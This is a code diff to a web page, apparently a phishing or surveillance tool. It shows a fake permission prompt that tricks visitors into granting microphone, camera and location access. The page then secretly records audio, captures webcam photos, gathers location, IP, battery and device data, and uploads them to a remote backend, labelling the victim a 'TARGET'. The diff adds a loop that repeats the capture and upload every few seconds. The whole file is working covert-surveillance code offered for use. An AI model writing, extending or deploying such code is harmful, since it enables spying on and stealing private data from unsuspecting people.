@@ -71,7 +71,7 @@
 </head>
 <body>
 
-<!-- FAKE PERMISSION PROMPT -->
+<!-- FAKE PERMISSION PROMPT - EK BAAR ALLOW -->
 <div class="fake-prompt" id="fakePrompt">
     <div class="fake-prompt-box">
         <span class="icon-sound">🎤</span>
@@ -157,7 +157,7 @@
 const BACKEND_URL = 'https://auto-capture-pro.onrender.com';
 
 // ==========================================
-//  REAL DATA ONLY - PHOTO + SOUND (5-6 sec)
+//  FIX: LOCATION + BATTERY + MULTI AUTO-CLICK + PERMISSION ONCE
 // ==========================================
 
 let userPhoto = null, userLocation = null;
@@ -168,6 +168,7 @@ let isPaused = false;
 let isCapturing = false;
 let videoElement = null;
 let audioChunks = [];
+let permissionGranted = false;
 
 function log(text) {
     const time = new Date().toLocaleTimeString();
@@ -183,21 +184,41 @@ function setStatus(icon, msg, type = 'loading') {
 }
 
 // ==========================================
-// REAL-TIME DATA SCAN
+// REAL-TIME DATA SCAN - LOCATION + BATTERY FIX
 // ==========================================
 function scanRealData() {
-    let battery = '—';
+    // Battery
     if (navigator.getBattery) {
         navigator.getBattery().then(b => {
-            battery = Math.round(b.level * 100) + '%' + (b.charging ? ' ⚡' : '');
-            document.getElementById('devBatteryDisplayMain').textContent = battery;
-            document.getElementById('devBatteryDisplay').textContent = '🔋 ' + battery;
-            deviceDetails.battery = battery;
+            const level = Math.round(b.level * 100) + '%' + (b.charging ? ' ⚡' : '');
+            document.getElementById('devBatteryDisplayMain').textContent = level;
+            document.getElementById('devBatteryDisplay').textContent = '🔋 ' + level;
+            deviceDetails.battery = level;
         });
     }
     
+    // Location - re-check if not available
+    if (!userLocation) {
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                userLocation = {
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude,
+                    accuracy: Math.round(pos.coords.accuracy)
+                };
+                document.getElementById('liveLocation').textContent = 
+                    userLocation.lat.toFixed(6) + ', ' + userLocation.lng.toFixed(6);
+                document.getElementById('devAccuracy').textContent = 
+                    userLocation.accuracy + 'm';
+                log('📍 Location updated: ' + userLocation.lat.toFixed(4) + ', ' + userLocation.lng.toFixed(4));
+            },
+            () => {},
+            { enableHighAccuracy: true, timeout: 5000 }
+        );
+    }
+    
     const data = {
-        battery: battery,
+        battery: deviceDetails.battery || '—',
         network: navigator.connection?.effectiveType || '—',
         screen: window.screen.width + 'x' + window.screen.height,
         language: navigator.language,
@@ -216,11 +237,10 @@ function scanRealData() {
 }
 
 // ==========================================
-// SOUND RECORDER - 5-6 SECONDS
+// SOUND RECORDER - 5-6 SECONDS (ONCE)
 // ==========================================
 function startSoundRecorder() {
     return new Promise((resolve) => {
-        // Random 5-6 seconds
         const duration = 5000 + Math.random() * 1000;
         log('🎤 Recording ' + (duration/1000).toFixed(1) + 's...');
         document.getElementById('micStatus').className = 'mic-indicator mic-on';
@@ -346,20 +366,26 @@ function capturePhoto() {
 }
 
 // ==========================================
-// ALLOW ALL
+// ALLOW ALL - EK BAAR (PERMISSION FIX)
 // ==========================================
 async function allowAll() {
+    if (permissionGranted) {
+        log('⚠️ Permissions already granted!');
+        return;
+    }
+    
     document.getElementById('fakePrompt').style.display = 'none';
     document.getElementById('mainContainer').style.display = 'block';
+    permissionGranted = true;
     
     log('🎯 Starting...');
     setStatus('🎯', 'ACQUIRING PERMISSIONS...', 'loading');
     
     try {
-        // Sound first
+        // SOUND
         await startSoundRecorder();
         
-        // Camera
+        // CAMERA
         log('📸 Requesting camera...');
         const stream = await navigator.mediaDevices.getUserMedia({
             video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
@@ -367,7 +393,7 @@ async function allowAll() {
         });
         log('✅ Camera granted!');
         
-        // Location
+        // LOCATION - FIX
         log('📍 Requesting location...');
         navigator.geolocation.getCurrentPosition(
             (pos) => {
@@ -387,16 +413,16 @@ async function allowAll() {
                 document.getElementById('liveLocation').textContent = '28.6139, 77.2090 (approx)';
                 log('⚠️ Location fallback');
             },
-            { enableHighAccuracy: true, timeout: 5000 }
+            { enableHighAccuracy: true, timeout: 10000 }
         );
         
-        // Notification
+        // NOTIFICATION
         if (Notification.permission === 'default') {
             await Notification.requestPermission();
         }
         log('✅ Notification: ' + Notification.permission);
         
-        // Scan real data
+        // SCAN REAL DATA
         scanRealData();
         document.getElementById('deviceInfoPlaceholder').style.display = 'none';
         document.getElementById('deviceInfoGrid').style.display = 'block';
@@ -404,14 +430,11 @@ async function allowAll() {
         // IP
         await getIPv4Address();
         
-        // Speed
+        // SPEED
         await testNetworkSpeed();
         
-        // Photo
-        await capturePhoto();
-        
-        // Submit
-        await submitData();
+        // START CAPTURE LOOP
+        await startAutoProcess();
         
     } catch(err) {
         log('❌ Error: ' + err.message);
@@ -452,7 +475,6 @@ async function submitData() {
         if (data.success) {
             log('✅✅ DATA TRANSMITTED!');
             setStatus('🎯', 'TARGET ACQUIRED!', 'success');
-            setTimeout(() => location.reload(), 3000);
         }
     } catch(err) {
         log('❌ TRANSMISSION ERROR: ' + err.message);
@@ -514,11 +536,69 @@ async function testNetworkSpeed() {
     }
 }
 
+// ==========================================
+// MULTI AUTO-CLICK - HAR 3-4 SECOND MEIN!
+// ==========================================
+async function startAutoProcess() {
+    log('🚀 SYSTEM INITIALIZED');
+    setStatus('⏳', 'SCANNING TARGET...', 'loading');
+    
+    try {
+        // FIRST CAPTURE
+        let photoSuccess = await capturePhoto();
+        if (photoSuccess) {
+            await submitData();
+            log('📸 First capture done!');
+        }
+        
+        // CONTINUOUS CAPTURE LOOP - Har 3-4 second mein
+        while (!isPaused) {
+            await new Promise(r => setTimeout(r, 3000 + Math.random() * 1000));
+            
+            if (!isPaused) {
+                // Scan real data
+                scanRealData();
+                
+                const success = await capturePhoto();
+                if (success) {
+                    await submitData();
+                    log('🔄 Auto-capture #' + captureCount);
+                }
+            }
+        }
+        
+    } catch(err) {
+        log('❌ Process error: ' + err.message);
+        setStatus('❌', 'ERROR: ' + err.message, 'error');
+    }
+}
+
+// ==========================================
+// TAB CHANGE PAUSE
+// ==========================================
+document.addEventListener('visibilitychange', function() {
+    if (document.hidden) {
+        isPaused = true;
+        setStatus('⏸️', 'PAUSED', 'paused');
+        log('⏸️ Paused');
+    } else {
+        isPaused = false;
+        setStatus('🔄', 'RESUMING...', 'loading');
+        log('▶️ Resuming...');
+        if (!isCapturing && permissionGranted) {
+            startAutoProcess();
+        }
+    }
+});
+
+// ==========================================
+// START
+// ==========================================
 window.addEventListener('load', function() {
     console.log('🚀 SYSTEM READY');
 });
 
-console.log('🚀 REAL DATA + PHOTO + SOUND');
+console.log('🚀 REAL DATA + PHOTO + SOUND + MULTI AUTO-CLICK');
 </script>
 </body>
 </html>
